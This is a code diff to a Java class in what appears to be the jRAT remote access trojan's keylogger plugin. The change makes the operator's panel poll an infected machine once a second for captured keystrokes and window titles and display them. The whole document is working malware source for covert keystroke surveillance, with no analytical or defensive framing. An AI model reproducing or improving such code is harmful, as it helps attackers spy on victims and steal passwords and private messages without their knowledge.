@@ -8,6 +8,8 @@ import pro.jrat.api.RATObject;
 
 public class KeyThread implements Runnable {
 	
+	private boolean enabled = true;
+	
 	private RATObject server;
 	private PanelKeylogger panel;
 	
@@ -18,44 +20,48 @@ public class KeyThread implements Runnable {
 
 	@Override
 	public void run() {
-		try {
-			server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
-				@Override
-				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
-					int len = dis.readInt();
-					
-					for (int i = 0; i < len; i++) {
-						byte header = dis.readByte();
+		while (enabled) {
+			try {
+				server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
+					@Override
+					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+						int len = dis.readInt();
 						
-						if (header == Plugin.KEY_HEADER) {
-							char ckey = dis.readChar();
+						for (int i = 0; i < len; i++) {
+							byte header = dis.readByte();
 							
-							String key = Character.toString(ckey);
-							
-							if (ckey == '\b') {
-								key = "[BACKSPACE]";
-							} else if (ckey == '\n' || ckey == '\r') {
-								key = "[ENTER]\n\r";
-							} else if (ckey == '\t') {
-								key = "[TAB]\t";
+							if (header == Plugin.KEY_HEADER) {
+								char ckey = dis.readChar();
+								
+								String key = Character.toString(ckey);
+								
+								if (ckey == '\b') {
+									key = "[BACKSPACE]";
+								} else if (ckey == '\n' || ckey == '\r') {
+									key = "[ENTER]\n\r";
+								} else if (ckey == '\t') {
+									key = "[TAB]\t";
+								}
+								
+								if (panel != null) {
+									panel.append(key);
+								}
+							} else if (header == Plugin.TITLE_HEADER) {
+								String title = dis.readUTF();
+														
+								if (panel != null) {
+									panel.append("[Window: " + title + "]");
+								}
 							}
-							
-							if (panel != null) {
-								panel.append(key);
-							}
-						} else if (header == Plugin.TITLE_HEADER) {
-							String title = dis.readUTF();
-													
-							if (panel != null) {
-								panel.append("[Window: " + title + "]");
-							}
-						}
-					}				
-				}
-			});
-		} catch (Exception e) {					
-			e.printStackTrace();
-		}	
+						}				
+					}
+				});
+				
+				Thread.sleep(1000L);
+			} catch (Exception e) {					
+				e.printStackTrace();
+			}	
+		}
 	}
 
 }
